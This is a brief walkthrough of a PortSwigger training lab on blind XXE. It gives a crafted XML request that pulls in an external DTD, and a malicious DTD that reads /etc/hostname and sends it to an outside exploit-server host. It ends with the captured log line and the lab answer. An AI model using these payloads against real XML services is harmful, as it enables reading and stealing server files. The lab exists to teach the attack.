# Lab: Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
# https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction

```bash
# Send stock request to repeater.
```

```bash    
#Update xml part of the request.

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY % loadDtd SYSTEM "https://exploit-0a91001c035d2247852ba89c013c0018.exploit-server.net/exploit">
%loadDtd;
%stack;
%exfil;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
```bash
# Paste this into body at exploit server and store the code
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0a91001c035d2247852ba89c013c0018.exploit-server.net/?%file;'>">
```
```bash
# Now send the request from repeater.
# After that check the response from access log.

"GET /?6ff56532030e HTTP/1.1" 200 "User-Agent: Java/21.0.1"
# Submit solution: 6ff56532030e
```
